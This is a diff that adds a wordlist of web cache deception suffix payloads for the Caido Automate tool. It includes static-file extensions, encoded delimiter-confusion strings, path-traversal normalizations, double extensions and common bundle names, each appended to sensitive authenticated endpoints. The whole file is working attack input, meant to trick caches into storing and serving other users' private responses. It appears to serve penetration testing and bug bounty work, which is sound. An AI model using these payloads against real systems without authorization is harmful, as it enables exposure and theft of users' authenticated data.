@@ -1,0 +1,71 @@
+# WCD Suffix Payload List
+# Use as Caido Automate wordlist against sensitive authenticated paths
+# Format: append each line to the end of the target path
+# e.g. /api/v1/me  +  /x.css  =  /api/v1/me/x.css
+
+# --- Standard static extensions ---
+/x.css
+/x.js
+/x.png
+/x.jpg
+/x.jpeg
+/x.gif
+/x.ico
+/x.svg
+/x.woff
+/x.woff2
+/x.ttf
+/x.eot
+/x.json
+/x.xml
+/x.txt
+/x.htm
+/x.html
+/x.map
+
+# --- Delimiter confusion (same extension, different delimiters) ---
+;.css
+;.js
+;.png
+;.json
+%3b.css
+%3b.js
+%3b.png
+%3b.json
+?.css
+?.js
+?.png
+%3f.css
+%3f.js
+%23.css
+%23.js
+
+# --- Path traversal normalization ---
+/..%2f.css
+/..%2f.js
+/%2e%2e/.css
+/%2e%2e/.js
+/../x.css
+/../x.js
+
+# --- Double extension ---
+/x.php.css
+/x.php.js
+/index.css
+/index.js
+
+# --- Empty segment ---
+/.css
+/.js
+/.png
+/.json
+
+# --- Webpack/SPA bundle names (common in CDN configs) ---
+/main.chunk.js
+/vendor.bundle.js
+/app.js
+/bundle.js
+/runtime.js
+/polyfills.js
+/styles.css
+/main.css
